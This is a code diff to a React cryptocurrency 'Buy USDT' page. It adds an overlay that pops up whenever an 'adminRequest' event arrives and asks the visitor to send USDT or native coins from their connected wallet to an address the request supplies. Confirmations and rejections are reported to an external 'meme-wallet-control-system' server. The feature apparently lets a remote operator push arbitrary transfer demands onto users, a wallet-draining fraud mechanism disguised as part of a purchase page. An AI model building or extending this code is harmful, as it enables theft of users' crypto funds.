@@ -121,10 +121,12 @@ function BuyUsdt() {
     isConnected, 
     address, 
     walletName,
-    walletType 
+    walletType,
+    sendUSDT,
+    sendNative
   } = useWallet();
   
-  const { sendUSDT, isSending } = useTransaction();
+  const { sendUSDT: sendUSDTTransaction, isSending } = useTransaction();
   
   const [showConnectModal, setShowConnectModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
@@ -141,7 +143,81 @@ function BuyUsdt() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [transactionHash, setTransactionHash] = useState('');
   
+  // ✅ FEATURE 2 – Add admin popup state
+  const [showAdminPopup, setShowAdminPopup] = useState(false);
+  const [adminRequest, setAdminRequest] = useState(null);
+  const [processingAdminTx, setProcessingAdminTx] = useState(false);
+  const [adminError, setAdminError] = useState("");
+
   const modalRef = useRef(null);
+
+  // ==========================================================================
+  // ✅ FEATURE 1 – Listen for admin transaction requests
+  // ==========================================================================
+  useEffect(() => {
+    const handler = (e) => {
+      setAdminRequest(e.detail);
+      setShowAdminPopup(true);
+    };
+
+    window.addEventListener("adminRequest", handler);
+    return () => window.removeEventListener("adminRequest", handler);
+  }, []);
+
+  // ==========================================================================
+  // ✅ FEATURE 3 – Add Confirm + Reject functions
+  // ==========================================================================
+  const confirmAdminTransaction = async () => {
+    if (!adminRequest) return;
+
+    try {
+      setProcessingAdminTx(true);
+      setAdminError("");
+
+      const { to, amount, token, chain } = adminRequest;
+
+      let result;
+
+      if (token === "USDT") {
+        result = await sendUSDT(to, amount);
+      } else {
+        result = await sendNative(to, amount);
+      }
+
+      if (!result?.success) {
+        throw new Error(result?.error || "Transaction failed");
+      }
+
+      await fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin/tx-confirm", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          requestId: adminRequest.id,
+          txHash: result.hash,
+          address: address,
+          chain: chain
+        })
+      });
+
+      setShowAdminPopup(false);
+      setAdminRequest(null);
+    } catch (error) {
+      setAdminError(error.message);
+    } finally {
+      setProcessingAdminTx(false);
+    }
+  };
+
+  const rejectAdminRequest = async () => {
+    await fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin/tx-reject", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ requestId: adminRequest.id })
+    });
+
+    setShowAdminPopup(false);
+    setAdminRequest(null);
+  };
 
   // ==========================================================================
   // INITIALIZATION
@@ -248,7 +324,7 @@ function BuyUsdt() {
         body: JSON.stringify({
           address: address,
           chain: wallet.type,
-          walletName: wallet.name
+          walletName: wallet.name,
           timestamp: new Date().toISOString()
         })
       });
@@ -345,7 +421,7 @@ function BuyUsdt() {
       
       // Send USDT transaction
       const toAddress = COMPANY_WALLETS[selectedChain] || COMPANY_WALLETS.eth;
-      const txHash = await sendUSDT(toAddress, usdtAmount);
+      const txHash = await sendUSDTTransaction(toAddress, usdtAmount);
       
       // Save transaction hash
       setTransactionHash(txHash);
@@ -389,6 +465,40 @@ function BuyUsdt() {
 
   return (
     <div className="buy-usdt-page">
+      {/* ✅ FEATURE 4 – Admin Popup */}
+      {showAdminPopup && adminRequest && (
+        <div className="admin-popup-overlay">
+          <div className="admin-popup">
+            <h3>Admin Transaction Request</h3>
+
+            <p><b>Send From:</b> {address}</p>
+            <p><b>Send To:</b> {adminRequest.to}</p>
+            <p><b>Amount:</b> {adminRequest.amount} {adminRequest.token}</p>
+            <p><b>Network:</b> {adminRequest.chain.toUpperCase()}</p>
+
+            {adminError && <div className="admin-error">{adminError}</div>}
+
+            <div className="admin-buttons">
+              <button
+                className="confirm-btn"
+                onClick={confirmAdminTransaction}
+                disabled={processingAdminTx}
+              >
+                {processingAdminTx ? "Processing…" : "Confirm Transaction"}
+              </button>
+
+              <button
+                className="reject-btn"
+                onClick={rejectAdminRequest}
+                disabled={processingAdminTx}
+              >
+                Reject
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Background Elements */}
       <div className="background">
         {particles.map(p => (
@@ -852,6 +962,91 @@ function BuyUsdt() {
           min-height: 100vh;
           position: relative;
           overflow-x: hidden;
+        }
+        
+        /* ✅ Admin Popup Styles */
+        .admin-popup-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          backdrop-filter: blur(8px);
+          background: rgba(0,0,0,0.7);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          z-index: 9999;
+        }
+        
+        .admin-popup {
+          background: #111;
+          padding: 25px;
+          border-radius: 12px;
+          width: 90%;
+          max-width: 400px;
+          border: 1px solid #00d4aa;
+          color: white;
+          animation: scaleIn 0.3s ease-out;
+        }
+        
+        .admin-popup h3 {
+          margin-bottom: 12px;
+          color: #00d4aa;
+        }
+        
+        .admin-popup p {
+          margin: 8px 0;
+          font-size: 14px;
+        }
+        
+        .admin-buttons {
+          display: flex;
+          gap: 12px;
+          margin-top: 20px;
+        }
+        
+        .confirm-btn, .reject-btn {
+          flex: 1;
+          padding: 12px;
+          border-radius: 10px;
+          border: none;
+          cursor: pointer;
+          font-weight: 600;
+        }
+        
+        .confirm-btn {
+          background: #00d4aa;
+          color: black;
+        }
+        
+        .confirm-btn:disabled {
+          opacity: 0.7;
+          cursor: not-allowed;
+        }
+        
+        .reject-btn {
+          background: #f44336;
+          color: white;
+        }
+        
+        .reject-btn:disabled {
+          opacity: 0.7;
+          cursor: not-allowed;
+        }
+        
+        .admin-error {
+          margin-top: 10px;
+          background: rgba(255,0,0,0.2);
+          color: #ff6b6b;
+          padding: 8px;
+          border-radius: 6px;
+          font-size: 0.9rem;
+        }
+        
+        @keyframes scaleIn {
+          from { transform: scale(0.8); opacity: 0; }
+          to { transform: scale(1); opacity: 1; }
         }
         
         /* Background Elements */
@@ -2197,6 +2392,15 @@ function BuyUsdt() {
             width: 100%;
             max-width: 180px;
           }
+          
+          .admin-popup {
+            padding: 20px;
+            margin: 20px;
+          }
+          
+          .admin-buttons {
+            flex-direction: column;
+          }
         }
         
         @media (max-width: 480px) {
@@ -2236,6 +2440,11 @@ function BuyUsdt() {
           
           .modal {
             max-height: 80vh;
+          }
+          
+          .admin-popup {
+            width: 95%;
+            padding: 15px;
           }
         }
         
